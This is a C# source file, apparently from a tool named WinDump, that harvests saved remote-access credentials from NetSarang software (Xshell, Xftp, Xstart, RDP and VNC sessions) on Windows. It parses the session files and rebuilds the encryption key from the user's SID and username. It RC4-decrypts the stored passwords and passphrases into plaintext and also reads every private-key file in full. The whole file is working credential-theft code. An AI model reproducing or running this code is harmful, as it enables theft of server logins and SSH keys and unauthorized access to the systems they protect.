using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace WinDump
{
    internal class XManager
    {
        internal static WindowsIdentity id = WindowsIdentity.GetCurrent();
        internal static DataTable GetSession()
        {
            var dt = new DataTable();
            dt.Columns.Add("Name");
            dt.Columns.Add("Proto");
            dt.Columns.Add("Host");
            dt.Columns.Add("Port");
            dt.Columns.Add("User");
            dt.Columns.Add("Password");
            dt.Columns.Add("Key");
            dt.Columns.Add("Passphrase"); 
            dt.Columns.Add("LastModified");
            dt.Columns.Add("Version");
            string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string nsPath = Path.Combine(docPath, "NetSarang Computer");
            if (!Directory.Exists(nsPath))
            {
                return dt;
            }
            // Xshell
            foreach(var file in Directory.GetFiles(nsPath, "*.xsh", SearchOption.AllDirectories))
            {

                var ini = new IniParser(file);
                var name = Path.GetFileName(file);
                var proto = ini.GetValue("CONNECTION", "Protocol");
                var host = ini.GetValue("CONNECTION", "Host");
                var port = ini.GetValue("CONNECTION", "Port");
                var user = ini.GetValue("CONNECTION:AUTHENTICATION", "UserName");
                // 解密pass
                var pass = ini.GetValue("CONNECTION:AUTHENTICATION", "Password");
                var key = ini.GetValue("CONNECTION:AUTHENTICATION", "UserKey");
                // 解密phrase
                var phrase = ini.GetValue("CONNECTION:AUTHENTICATION", "Passphrase");
                var last = File.GetLastWriteTime(file);

                var version = ini.GetValue("SessionInfo", "Version");
                dt.Rows.Add(name, proto, host, port, user, pass, key, phrase, last, version);
            }
            // Xftp
            foreach (var file in Directory.GetFiles(nsPath, "*.xfp", SearchOption.AllDirectories))
            {
                var ini = new IniParser(file);
                var name = Path.GetFileName(file);
                var proto = ini.GetValue("CONNECTION", "Protocol") == "0" ? "FTP" : "SFTP";
                var host = ini.GetValue("CONNECTION", "Host");
                var port = ini.GetValue("CONNECTION", "Port");
                var user = ini.GetValue("CONNECTION", "UserName");
                // 解密pass
                var pass = ini.GetValue("CONNECTION", "Password");
                var key = ini.GetValue("CONNECTION", "UserKey");
                // 解密phrase
                var phrase = ini.GetValue("CONNECTION", "UserKeyPassPhrase");
                var last = File.GetLastWriteTime(file);
                var version = ini.GetValue("SessionInfo", "Version");
                dt.Rows.Add(name, proto, host, port, user, pass, key, phrase, last, version);
            }
            // Xstart 
            foreach (var file in Directory.GetFiles(nsPath, "*.xcas", SearchOption.AllDirectories))
            {
                var ini = new IniParser(file);
                var name = Path.GetFileName(file);
                var proto = ini.GetValue("SESSION", "Protocol") == "0" ? "FTP" : "SFTP";
                var host = ini.GetValue("SESSION", "Host");
                var port = ini.GetValue("SSH", "Port");
                var user = ini.GetValue("SESSION", "UserName");
                // 解密pass
                var pass = ini.GetValue("SESSION", "Password");
                var key = ini.GetValue("SSH", "PublicKey");
                // 解密phrase
                var phrase = ini.GetValue("SSH", "Passphrase");
                var last = File.GetLastWriteTime(file);

                var version = ini.GetValue("SessionInfo", "Version");
                dt.Rows.Add(name, proto, host, port, user, pass, key, phrase, last, version);
            }
            // RDP
            foreach (var file in Directory.GetFiles(nsPath, "*.xard", SearchOption.AllDirectories))
            {
                var ini = new IniParser(file);
                var name = Path.GetFileName(file);
                var proto = ini.GetValue("GENERAL", "Protocol");
                var host = ini.GetValue("GENERAL", "Host");
                var port = ini.GetValue("GENERAL", "Port");
                var user = ini.GetValue("GENERAL", "UserName");
                // 解密pass
                var pass = ini.GetValue("GENERAL", "Password");
                var key = "";
                var phrase = "";
                var last = File.GetLastWriteTime(file);
                var version = GetVersionFromPath(file);

                dt.Rows.Add(name, proto, host, port, user, pass, key, phrase, last,version);
            }
            // VNC
            foreach (var file in Directory.GetFiles(nsPath, "*.xvnc", SearchOption.AllDirectories))
            {
                var ini = new IniParser(file);
                var name = Path.GetFileName(file);
                var proto = "VNC";
                var host = ini.GetValue("CONNECTION", "Host");
                var port = ini.GetValue("CONNECTION", "Port");
                var user = "";
                // 解密pass
                var pass = ini.GetValue("SESSION", "Password");
                var key = "";
                var phrase = "";
                var last = File.GetLastWriteTime(file);
                var version = GetVersionFromPath(file);
                dt.Rows.Add(name, proto, host, port, user, pass, key, phrase, last,version);
            }
            foreach (DataRow row in dt.Rows) { 
                Decrypt(row);
            }
            return dt;
        }
        internal static DataTable GetUserKey()
        {
            var dt = new DataTable();
            dt.Columns.Add("Name");
            dt.Columns.Add("Content");
            string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string nsPath = Path.Combine(docPath, "NetSarang Computer");
            if (!Directory.Exists(nsPath))
            {
                return dt;
            }
            foreach (var file in Directory.GetFiles(nsPath, "*.pri", SearchOption.AllDirectories))
            {
                var name = Path.GetFileName(file);
                var content = File.ReadAllText(file);
                dt.Rows.Add(name, content);
            }
            return dt;

        }
        internal static string GetVersionFromPath(string path)
        {
            var pos = path.IndexOf("NetSarang Computer");
            if (pos == -1)
            {
                return "";
            }
            var start = pos + 1 + "NetSarang Computer".Length;
            var end = path.IndexOf("\\", start);
            if (end == -1)
            {
                return "";
            }
            return path.Substring(start, end - start);

        }
        internal static byte[] GetKey(string version)
        {
            byte[] key;
            var sid = id.User.ToString();
            var username = Environment.UserName;
            if (version[0] < '7')
            {
                key = Encoding.UTF8.GetBytes(username + sid);
            }
            else
            {
                var ca = sid.ToCharArray();
                Array.Reverse(ca);
                var rsid = new string(ca);
                key = Encoding.UTF8.GetBytes(rsid + username);
            }

            return new SHA256Managed().ComputeHash(key);
        }
        internal static byte[] GetRDPKey()
        {
            var sid = id.User.ToString();
            var key = Encoding.UTF8.GetBytes(sid);
            return new SHA256Managed().ComputeHash(key);
        }
        internal static void Decrypt(DataRow row)
        {
            var version = row["Version"].ToString();
            byte[] key;
            var isrdp = row["Proto"].ToString() == "RDP";
            if (isrdp)
            {
                key = GetRDPKey();
            }
            else
            {
                key = GetKey(version);
            }
            var pwd = row["Password"] as string;
            if (pwd !=null && pwd.Length>32 ) { 
                var data = RC4Decrypt(Convert.FromBase64String(pwd), key);

                 if (data.Length > 32)
                {
                    if (isrdp)
                    {
                        row["Password"] = Encoding.UTF8.GetString(data, 4, data.Length - 32 - 4);
                    }
                    else
                    {
                        row["Password"] = Encoding.UTF8.GetString(data, 0, data.Length - 32);
                    }
                }

            
            }
            var phrase = row["Passphrase"] as string;
            if (phrase != null && phrase.Length > 32)
            {
                var data = RC4Decrypt(Convert.FromBase64String(phrase), key);
                if (data.Length > 32)
                {
                    Array.Resize(ref data, data.Length - 32);
                    row["Passphrase"] = Encoding.UTF8.GetString(data);
                }
            }

        }
        internal static byte[] RC4Decrypt(byte[] data, byte[] pwd)
        {
            int[] array = new int[256];
            int[] array2 = new int[256];
            byte[] array3 = new byte[data.Length];
            int i;
            for (i = 0; i < 256; i++)
            {
                array[i] = pwd[i % pwd.Length];
                array2[i] = i;
            }
            int num = i = 0;
            for (; i < 256; i++)
            {
                num = (num + array2[i] + array[i]) % 256;
                int num2 = array2[i];
                array2[i] = array2[num];
                array2[num] = num2;
            }
            int num3 = num = (i = 0);
            for (; i < data.Length; i++)
            {
                num3++;
                num3 %= 256;
                num += array2[num3];
                num %= 256;
                int num2 = array2[num3];
                array2[num3] = array2[num];
                array2[num] = num2;
                int num4 = array2[(array2[num3] + array2[num]) % 256];
                array3[i] = (byte)(data[i] ^ num4);
            }
            return array3;
        }
    }
    
}
